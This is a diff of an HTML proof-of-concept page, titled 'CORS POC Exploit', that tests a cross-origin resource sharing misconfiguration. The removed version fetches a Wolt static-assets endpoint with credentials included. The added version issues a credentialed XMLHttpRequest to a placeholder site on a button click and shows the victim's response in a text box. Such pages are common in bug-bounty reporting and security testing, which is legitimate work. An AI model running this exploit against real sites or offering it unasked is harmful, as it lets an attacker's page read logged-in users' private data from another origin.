@@ -1,20 +1,69 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <h2>CORS Exploit PoC</h2>
-    <pre id="output">Loading...</pre>
+<head>
+  <meta charset="UTF-8">
+  <title>CORS PoC Exploit</title>
+  <style>
+    body {
+      background-color: #121212;
+      color: white;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 50px;
+    }
 
-    <script>
-      fetch("https://consumer-static-assets.wolt.com/your_target_endpoint", {
-        credentials: "include"
-      })
-      .then(res => res.text())
-      .then(data => {
-        document.getElementById("output").innerText = data;
-      })
-      .catch(err => {
-        document.getElementById("output").innerText = "Error: " + err;
-      });
-    </script>
-  </body>
+    a {
+      color: #4fa3ff;
+      text-decoration: none;
+    }
+
+    button {
+      background-color: #333;
+      color: white;
+      border: 1px solid #888;
+      padding: 10px 20px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    textarea {
+      background-color: #1e1e2f;
+      color: #ccc;
+      border: 1px solid #888;
+      width: 75%;
+      height: 250px;
+      margin-top: 20px;
+      resize: none;
+      font-family: monospace;
+      font-size: 14px;
+    }
+
+    hr {
+      border: 1px solid #888;
+      width: 80%;
+    }
+  </style>
+</head>
+<body>
+  <h2>CORS POC Exploit</h2>
+  <h3>created by dima_bolich</h3>
+
+  <button onclick="exploitCORS()">Fetch from the target!</button>
+  <hr>
+  <textarea id="fetchedResource" placeholder="Click on the button to fetch resource!"></textarea>
+
+  <script>
+    function exploitCORS(){
+      var req = new XMLHttpRequest();
+      req.onload = reqListener;
+      req.open('GET', 'https://yoursitehere/', true);
+      req.withCredentials = true;
+      req.send();
+    }
+
+    function reqListener(){
+      document.getElementById("fetchedResource").value = this.responseText;
+    }
+  </script>
+</body>
 </html>
